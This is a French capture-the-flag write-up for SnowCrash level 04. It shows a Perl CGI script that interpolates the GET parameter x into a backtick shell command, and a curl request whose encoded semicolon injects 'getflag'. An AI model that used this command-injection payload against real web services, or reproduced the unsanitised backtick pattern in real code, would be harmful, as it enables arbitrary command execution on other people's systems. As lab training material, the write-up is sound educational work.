# Level 04

```bash
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
```

Ce script CGI lit le paramètre GET x et l’insère directement dans une commande exécutée via backticks, ce qui permet une injection de commande et l’exécution arbitraire de commandes système.
```perl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Du coup si on fait une requete curl comme ceci le script nous print le resultat de x dans la sortie standard

```bash
level04@SnowCrash:~$ curl "localhost:4747?x=hello"
hello
```
Pour pouvoir lancer la fonction 'getflag' et recuperer le flag necessaire pour avoir acces au prochain niveau nous devons URL-encoder le mot 'getflag' pour qu'il ne soit pas considerer comme string mais bien une commande a executer

```bash
level04@SnowCrash:~$ curl "localhost:4747?x=%3Bgetflag"
Check flag.Here is your token : **************
```